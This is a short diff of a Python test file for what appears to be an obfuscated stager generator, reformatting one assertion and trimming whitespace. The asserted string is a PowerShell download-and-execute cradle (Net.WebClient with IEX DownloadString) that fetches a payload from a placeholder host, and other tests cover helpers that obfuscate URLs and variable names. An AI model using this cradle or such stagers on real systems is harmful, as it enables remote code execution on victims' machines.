@@ -220,8 +220,7 @@ def test_encoded_stager_round_trips_the_inner_script(monkeypatch) -> None:
     encoded = rendered.rsplit(" ", 1)[-1]
 
     assert base64.b64decode(encoded).decode("utf-16-le") == (
-        "$client=New-Object Net.WebClient;"
-        "IEX($client.DownloadString('https://host/payload.ps1'))"
+        "$client=New-Object Net.WebClient;IEX($client.DownloadString('https://host/payload.ps1'))"
     )
 
 
@@ -283,4 +282,3 @@ def test_random_name_and_url_helpers_cover_empty_and_chunked_inputs(monkeypatch)
     assert stager._rand_var_vbs(4, 8) == "abbb"
     assert stager._split_url_for_obfuscation("") == []
     assert stager._split_url_for_obfuscation("abcdefgh") == ["abc", "def", "gh"]
-
